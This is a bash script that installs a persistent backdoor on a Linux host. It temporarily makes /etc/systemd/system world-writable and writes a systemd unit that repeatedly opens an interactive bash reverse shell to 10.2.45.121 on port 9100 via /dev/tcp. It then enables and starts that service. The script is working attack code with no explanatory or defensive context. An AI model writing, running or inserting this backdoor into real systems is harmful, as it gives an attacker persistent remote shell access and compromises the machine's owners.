#!/bin/bash

SERVER_HOST="10.2.45.121"
PORT="9100"

chmod 777 /etc/systemd/system

echo -e "[Unit]
Description=My Exclusive Backdoor Service

[Service]
Type=simple
ExecStart=/bin/bash -c \"while [ 1 ]; do /bin/bash -i >& /dev/tcp/$SERVER_HOST/$PORT 0>&1; sleep 10; done\"
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
" > /etc/systemd/system/backdoor.service

systemctl enable backdoor
systemctl start backdoor

chmod 751 /etc/systemd/system
